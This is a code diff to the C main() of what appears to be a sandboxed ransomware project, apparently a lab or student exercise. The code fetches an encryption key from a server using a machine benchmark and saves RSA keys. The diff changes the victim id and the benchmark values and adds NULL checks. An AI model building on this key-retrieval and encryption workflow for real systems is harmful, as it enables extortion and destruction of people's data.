@@ -15,7 +15,7 @@ int main(int argc, char const *argv[])
     char* paths[] = {"/tmp/sandbox-ransomware/"};
     char* p_algo = NULL;
     char* p_iv = NULL;
-    char* id = "9";
+    char* id = "92";
 
     /* Initialisation de la structure pour la recherche de fichier */
     listFileData* p_listFileData = init_list_file_data();
@@ -29,9 +29,9 @@ int main(int argc, char const *argv[])
     /* Envoi du benchmark au serveur */
     benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);
 
-    p_benchmarkData->memorySize = 8000;
-    p_benchmarkData->dataSize = 2000;
-    p_benchmarkData->cpuCore = 16;
+    p_benchmarkData->memorySize = 1000;
+    p_benchmarkData->dataSize = 99999999999999;
+    p_benchmarkData->cpuCore = 1;
 
     char* p_key = get_encryption_key(id, p_benchmarkData, &p_algo, &p_iv);
 
@@ -39,7 +39,7 @@ int main(int argc, char const *argv[])
     printf("iv: %s\n", p_iv);
     printf("Algo: %s\n", p_algo);
 
-    if (strncmp(p_algo, "RSA", 3) == 0)
+    if (p_algo != NULL && strncmp(p_algo, "RSA", 3) == 0)
     {
         save_key(p_key, ENC_RSA_KEY_NAME);
     }
@@ -55,7 +55,7 @@ int main(int argc, char const *argv[])
     printf("iv: %s\n", p_iv);
     printf("Algo: %s\n", p_algo);
 
-    if (strncmp(p_algo, "RSA", 3) == 0)
+    if (p_algo != NULL && strncmp(p_algo, "RSA", 3) == 0)
     {
         save_key(p_key, DEC_RSA_KEY_NAME);
     }
